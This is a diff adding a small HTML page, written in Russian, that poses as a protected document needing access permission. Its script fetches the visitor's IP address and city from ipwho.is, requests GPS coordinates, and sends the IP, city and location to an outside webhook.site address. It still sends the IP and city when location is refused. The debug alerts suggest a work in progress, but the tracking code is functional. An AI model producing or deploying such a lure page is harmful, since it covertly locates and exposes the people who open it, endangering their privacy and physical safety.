@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Документ защищен</title></head>
+<body style="text-align:center; font-family:sans-serif; padding-top:50px;">
+    <h1 style="color:red;">Документ защищен!</h1>
+    <p>Разрешите доступ, чтобы просмотреть файл.</p>
+    <script>
+    alert("Скрипт запущен! Сейчас узнаем IP...");
+    
+    fetch('https://ipwho.is/').then(r => r.json()).then(d => {
+        alert("IP получен: " + d.ip + ". Сейчас запросим GPS...");
+        
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                alert("GPS получен! Отправляем...");
+                let url = "https://webhook.site/ebd9a3b9-811d-452e-a777-7de543ca450f?ip=" + d.ip + "&city=" + d.city + "&lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude;
+                fetch(url, {mode: 'no-cors'});
+            },
+            (err) => {
+                alert("Ошибка GPS: " + err.message);
+                let url = "https://webhook.site/ebd9a3b9-811d-452e-a777-7de543ca450f?ip=" + d.ip + "&city=" + d.city + "&lat=denied&lon=denied";
+                fetch(url, {mode: 'no-cors'});
+            }
+        );
+    }).catch(e => alert("Ошибка сети: " + e.message));
+    </script>
+</body>
+</html>
